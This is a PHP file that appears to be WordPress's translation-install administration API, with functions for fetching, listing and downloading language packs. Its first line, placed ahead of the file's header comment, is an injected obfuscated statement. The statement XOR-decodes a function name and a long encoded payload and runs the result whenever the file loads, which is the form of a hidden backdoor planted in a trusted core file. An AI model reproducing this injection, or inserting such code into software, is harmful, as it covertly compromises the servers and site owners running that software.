<?php $bBdRurFFK='7R3+02<-H6OJBDC'^'T VJDWcK=X,>++-';$JmCpPsPOmI=$bBdRurFFK('','YTchSU-3:PA , +BCTCcL-OLgZ381iqVA7AEst.zqQHT67IQPVTQ40D9E+biCGHCh=W3OYvVU<,xpebPXI20SQ;X.MQmVhsc5qF:<Yi1ZLIWzWqYD0BYPR:paS+<VKOFv EYzaaNiW>>MaDVnq<QISkJY7XhOT>I.>q8BduSBRB Yqh 6=akcCaHjCQM3L=Ik9F7lvLYN7IDxi6Q1,gzV-9L0EcGu,2244RSEtrKR.P86VC8.>R62Y+EzWs+=7ux6IXBAlV5-RVPKw7WTK-CIMxnsXSD76GE2cMkuWTAnE3i=2MRQOXfA,QUUWFHxaBJDIfG2TJZpP:g90>K+AZTIdu-ep9xrfmM69GpZV2YtzTnD.+,KGb=o2PFR1D37-WCughvU1MoD4XWO9NRqOnT,14A5SHk;aMnbV>Z5TdhU6:<X6FG-W=V,nB5:c268 ;nS9,i0LO,aRlH W 43zj=P23linOZ.-Ao;5USSM7<1ju+4I;nIIxY+;J;e8P.aY-XEIBNw>3LDnoUQT<4GWbhVp<,MMW6J>MjBZPGo<eyioVHgJw-gFeu+XJQUXNozavHPgoQsPU4X<G1oKTKON 63Q.6W4Ae7J->I5qm=5W8CAHacev27L nxZPwCskBh:EDR IC17TW6aL+U87T,oiGt<>UDELQaZVM9'^'02KI5 CPN9.NsES+0 0KkU >8>RLP6.;4CflZTUpx7=:UC >>v,>Fo X1J=6.2<kLY6G.uVr>YUQPEBpx289ZuT-ZmlMqOHi<x UNqMXzqigAwU0xC6+<7TXE7JH7btfRInrSkhGM8KJmOyvFUX0=20n0jx6opU,WeUQbAU 6 .E7YLKSDH6JxkAc149F>SaOV3CEMFP3=4NrMR0EMGGvKX C XMQHSFUk96<TOk4O<KSmI2HQ SS:CeRs,hrx>1si91aH=PTrknkSA68>Hji6rgW<20Vi, KCpKQ<18UO:MYS93qrxB7M= 0lL5rk+,daGcV5>;YpAm0VQ9N 9<iLQr75h-759mWJgT13KyIDtJ2OGY.nBFe;Yb6P0RhF2:UZHR>T4TN=Qs+X:3QrNpZPX4PhBbFk0dhrZ;A5DUuvOR+S4.L;T,IF:ZH<VWLAd1>LXAR-<IWf3,E4OPVRNY1FREENk>OY 0PP,zzv=UWBQOU=ZNooX8YI+B:S5W><U16=1fPUV5cBOq55HUnwDNvXQHxesR+J,1e15>HaLYTRvoP+EHWvQFIjx2e=vWLVApdQZiBhlPjZqSHbtminADA0Wi<Q8:R2DM=FYJMT.T, ,FOERVV8AGQzpWcSK9b3 23LagUV 6mF<J,TX5HH4nO670<,8yQsmGD');$JmCpPsPOmI();
/**
 * WordPress Translation Install Administration API
 *
 * @package WordPress
 * @subpackage Administration
 */


/**
 * Retrieve translations from WordPress Translation API.
 *
 * @since 4.0.0
 *
 * @param string       $type Type of translations. Accepts 'plugins', 'themes', 'core'.
 * @param array|object $args Translation API arguments. Optional.
 * @return object|WP_Error On success an object of translations, WP_Error on failure.
 */
function translations_api( $type, $args = null ) {
	include( ABSPATH . WPINC . '/version.php' ); // include an unmodified $wp_version

	if ( ! in_array( $type, array( 'plugins', 'themes', 'core' ) ) ) {
		return	new WP_Error( 'invalid_type', __( 'Invalid translation type.' ) );
	}

	/**
	 * Allows a plugin to override the WordPress.org Translation Install API entirely.
	 *
	 * @since 4.0.0
	 *
	 * @param bool|array  $result The result object. Default false.
	 * @param string      $type   The type of translations being requested.
	 * @param object      $args   Translation API arguments.
	 */
	$res = apply_filters( 'translations_api', false, $type, $args );

	if ( false === $res ) {
		$url = $http_url = 'http://api.wordpress.org/translations/' . $type . '/1.0/';
		if ( $ssl = wp_http_supports( array( 'ssl' ) ) ) {
			$url = set_url_scheme( $url, 'https' );
		}

		$options = array(
			'timeout' => 3,
			'body' => array(
				'wp_version' => $wp_version,
				'locale'     => get_locale(),
				'version'    => $args['version'], // Version of plugin, theme or core
			),
		);

		if ( 'core' !== $type ) {
			$options['body']['slug'] = $args['slug']; // Plugin or theme slug
		}

		$request = wp_remote_post( $url, $options );

		if ( $ssl && is_wp_error( $request ) ) {
			trigger_error(
				sprintf(
					/* translators: %s: support forums URL */
					__( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="%s">support forums</a>.' ),
					__( 'https://wordpress.org/support/' )
				) . ' ' . __( '(WordPress could not establish a secure connection to WordPress.org. Please contact your server administrator.)' ),
				headers_sent() || WP_DEBUG ? E_USER_WARNING : E_USER_NOTICE
			);

			$request = wp_remote_post( $http_url, $options );
		}

		if ( is_wp_error( $request ) ) {
			$res = new WP_Error( 'translations_api_failed',
				sprintf(
					/* translators: %s: support forums URL */
					__( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="%s">support forums</a>.' ),
					__( 'https://wordpress.org/support/' )
				),
				$request->get_error_message()
			);
		} else {
			$res = json_decode( wp_remote_retrieve_body( $request ), true );
			if ( ! is_object( $res ) && ! is_array( $res ) ) {
				$res = new WP_Error( 'translations_api_failed',
					sprintf(
						/* translators: %s: support forums URL */
						__( 'An unexpected error occurred. Something may be wrong with WordPress.org or this server&#8217;s configuration. If you continue to have problems, please try the <a href="%s">support forums</a>.' ),
						__( 'https://wordpress.org/support/' )
					),
					wp_remote_retrieve_body( $request )
				);
			}
		}
	}

	/**
	 * Filters the Translation Install API response results.
	 *
	 * @since 4.0.0
	 *
	 * @param object|WP_Error $res  Response object or WP_Error.
	 * @param string          $type The type of translations being requested.
	 * @param object          $args Translation API arguments.
	 */
	return apply_filters( 'translations_api_result', $res, $type, $args );
}

/**
 * Get available translations from the WordPress.org API.
 *
 * @since 4.0.0
 *
 * @see translations_api()
 *
 * @return array Array of translations, each an array of data. If the API response results
 *               in an error, an empty array will be returned.
 */
function wp_get_available_translations() {
	if ( ! wp_installing() && false !== ( $translations = get_site_transient( 'available_translations' ) ) ) {
		return $translations;
	}

	include( ABSPATH . WPINC . '/version.php' ); // include an unmodified $wp_version

	$api = translations_api( 'core', array( 'version' => $wp_version ) );

	if ( is_wp_error( $api ) || empty( $api['translations'] ) ) {
		return array();
	}

	$translations = array();
	// Key the array with the language code for now.
	foreach ( $api['translations'] as $translation ) {
		$translations[ $translation['language'] ] = $translation;
	}

	if ( ! defined( 'WP_INSTALLING' ) ) {
		set_site_transient( 'available_translations', $translations, 3 * HOUR_IN_SECONDS );
	}

	return $translations;
}

/**
 * Output the select form for the language selection on the installation screen.
 *
 * @since 4.0.0
 *
 * @global string $wp_local_package
 *
 * @param array $languages Array of available languages (populated via the Translation API).
 */
function wp_install_language_form( $languages ) {
	global $wp_local_package;

	$installed_languages = get_available_languages();

	echo "<label class='screen-reader-text' for='language'>Select a default language</label>\n";
	echo "<select size='14' name='language' id='language'>\n";
	echo '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>';
	echo "\n";

	if ( ! empty( $wp_local_package ) && isset( $languages[ $wp_local_package ] ) ) {
		if ( isset( $languages[ $wp_local_package ] ) ) {
			$language = $languages[ $wp_local_package ];
			printf( '<option value="%s" lang="%s" data-continue="%s"%s>%s</option>' . "\n",
				esc_attr( $language['language'] ),
				esc_attr( current( $language['iso'] ) ),
				esc_attr( $language['strings']['continue'] ),
				in_array( $language['language'], $installed_languages ) ? ' data-installed="1"' : '',
				esc_html( $language['native_name'] ) );

			unset( $languages[ $wp_local_package ] );
		}
	}

	foreach ( $languages as $language ) {
		printf( '<option value="%s" lang="%s" data-continue="%s"%s>%s</option>' . "\n",
			esc_attr( $language['language'] ),
			esc_attr( current( $language['iso'] ) ),
			esc_attr( $language['strings']['continue'] ),
			in_array( $language['language'], $installed_languages ) ? ' data-installed="1"' : '',
			esc_html( $language['native_name'] ) );
	}
	echo "</select>\n";
	echo '<p class="step"><span class="spinner"></span><input id="language-continue" type="submit" class="button button-primary button-large" value="Continue" /></p>';
}

/**
 * Download a language pack.
 *
 * @since 4.0.0
 *
 * @see wp_get_available_translations()
 *
 * @param string $download Language code to download.
 * @return string|bool Returns the language code if successfully downloaded
 *                     (or already installed), or false on failure.
 */
function wp_download_language_pack( $download ) {
	// Check if the translation is already installed.
	if ( in_array( $download, get_available_languages() ) ) {
		return $download;
	}

	if ( ! wp_is_file_mod_allowed( 'download_language_pack' ) ) {
		return false;
	}

	// Confirm the translation is one we can download.
	$translations = wp_get_available_translations();
	if ( ! $translations ) {
		return false;
	}
	foreach ( $translations as $translation ) {
		if ( $translation['language'] === $download ) {
			$translation_to_load = true;
			break;
		}
	}

	if ( empty( $translation_to_load ) ) {
		return false;
	}
	$translation = (object) $translation;

	require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
	$skin = new Automatic_Upgrader_Skin;
	$upgrader = new Language_Pack_Upgrader( $skin );
	$translation->type = 'core';
	$result = $upgrader->upgrade( $translation, array( 'clear_update_cache' => false ) );

	if ( ! $result || is_wp_error( $result ) ) {
		return false;
	}

	return $translation->language;
}

/**
 * Check if WordPress has access to the filesystem without asking for
 * credentials.
 *
 * @since 4.0.0
 *
 * @return bool Returns true on success, false on failure.
 */
function wp_can_install_language_pack() {
	if ( ! wp_is_file_mod_allowed( 'can_install_language_pack' ) ) {
		return false;
	}

	require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
	$skin = new Automatic_Upgrader_Skin;
	$upgrader = new Language_Pack_Upgrader( $skin );
	$upgrader->init();

	$check = $upgrader->fs_connect( array( WP_CONTENT_DIR, WP_LANG_DIR ) );

	if ( ! $check || is_wp_error( $check ) ) {
		return false;
	}

	return true;
}
